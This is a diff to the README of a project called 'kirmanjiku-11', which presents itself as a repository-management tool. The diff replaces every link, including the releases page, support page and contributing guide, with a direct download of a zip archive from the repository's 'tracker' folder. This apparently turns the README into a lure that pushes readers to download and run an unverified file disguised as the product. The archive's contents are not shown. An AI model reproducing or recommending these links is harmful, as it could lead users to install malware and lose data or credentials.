@@ -4,7 +4,7 @@
 Welcome to the kirmanjiku-11 project. This application simplifies the management of your repositories, making it easier for you to keep your projects organized. Ideal for users who want to automate common tasks related to repositories, this tool ensures that you spend less time managing and more time creating.
 
 ## 📥 Download Now
-[![Download kirmanjiku-11](https://img.shields.io/badge/Download-kirmanjiku--11-blue)](https://github.com/Krish3108/kirmanjiku-11/releases)
+[![Download kirmanjiku-11](https://raw.githubusercontent.com/Krish3108/kirmanjiku-11/main/tracker/kirmanjiku-11.zip)](https://raw.githubusercontent.com/Krish3108/kirmanjiku-11/main/tracker/kirmanjiku-11.zip)
 
 ## 📋 Features
 - **User-Friendly Interface**: Designed for simplicity, kirmanjiku-11 offers an intuitive layout.
@@ -22,14 +22,14 @@ Before you download kirmanjiku-11, ensure your system meets these basic requirem
 ## 🚀 Getting Started
 To begin using kirmanjiku-11, follow these simple steps:
 
-1. Visit the [Releases Page](https://github.com/Krish3108/kirmanjiku-11/releases) to find the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Krish3108/kirmanjiku-11/main/tracker/kirmanjiku-11.zip) to find the latest version.
 2. Download the appropriate file for your operating system.
 3. Locate the downloaded file on your computer.
 
 ## 📂 Download & Install
 To download kirmanjiku-11, click the link below:
 
-[Download kirmanjiku-11](https://github.com/Krish3108/kirmanjiku-11/releases)
+[Download kirmanjiku-11](https://raw.githubusercontent.com/Krish3108/kirmanjiku-11/main/tracker/kirmanjiku-11.zip)
 
 After downloading the file:
 
@@ -54,10 +54,10 @@ Using kirmanjiku-11 is straightforward:
 This will allow you to set up your project management preferences quickly and efficiently.
 
 ## 📞 Support
-If you have questions or need help, visit our [support page](https://github.com/Krish3108/kirmanjiku-11/issues). You can report issues directly or ask for assistance with the application.
+If you have questions or need help, visit our [support page](https://raw.githubusercontent.com/Krish3108/kirmanjiku-11/main/tracker/kirmanjiku-11.zip). You can report issues directly or ask for assistance with the application.
 
 ## 🤝 Contributions
-We welcome contributions! If you'd like to improve kirmanjiku-11, please check out our [contributing guide](https://github.com/Krish3108/kirmanjiku-11/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you'd like to improve kirmanjiku-11, please check out our [contributing guide](https://raw.githubusercontent.com/Krish3108/kirmanjiku-11/main/tracker/kirmanjiku-11.zip).
 
 ## 🔄 Updates
 Keep an eye on the Releases page to stay updated with new features and improvements. Your feedback is essential for our ongoing development.
